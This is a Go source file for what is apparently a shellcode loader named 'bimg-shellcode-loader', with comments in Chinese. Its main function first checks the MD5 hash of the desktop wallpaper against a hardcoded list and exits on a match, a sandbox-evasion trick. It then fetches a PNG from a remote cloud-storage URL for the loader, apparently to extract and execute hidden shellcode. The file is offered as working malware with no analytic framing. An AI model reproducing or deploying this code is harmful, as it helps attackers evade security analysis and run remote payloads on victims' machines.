package main

import (
	"bimg-shellcode-loader/loader"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"github.com/reujab/wallpaper"
	"io"
	"os"
)

func main() {

	checkDesktopMd5()
	loader.Loader("https://txycct-1305644927.cos.ap-nanjing.myqcloud.com/file/out_file.png")
}

func checkDesktopMd5() {
	// 获取当前桌面壁纸路径
	path, err := wallpaper.Get()
	if err != nil {
		fmt.Println(err.Error())
	}

	// 计算文件的MD5值
	file, err := os.Open(path)
	if err != nil {
		fmt.Println(err.Error())
	}
	defer file.Close()

	hash := md5.New()
	if _, err := io.Copy(hash, file); err != nil {
		fmt.Println(err.Error())
	}

	md5value := hex.EncodeToString(hash.Sum(nil))
	// md5值列表
	md5List := []string{"fbfeb6772173fef2213992db05377231", "49150f7bfd879fe03a2f7d148a2514de", "fc322167eb838d9cd4ed6e8939e78d89", "178aefd8bbb4dd3ed377e790bc92a4eb", "0f8f1032e4afe1105a2e5184c61a3ce4", "da288dceaafd7c97f1b09c594eac7868"}
	// 判断md5值是否在列表中
	for _, value := range md5List {
		if value == md5value {
			//   程序退出
			os.Exit(0)
		}
	}
}
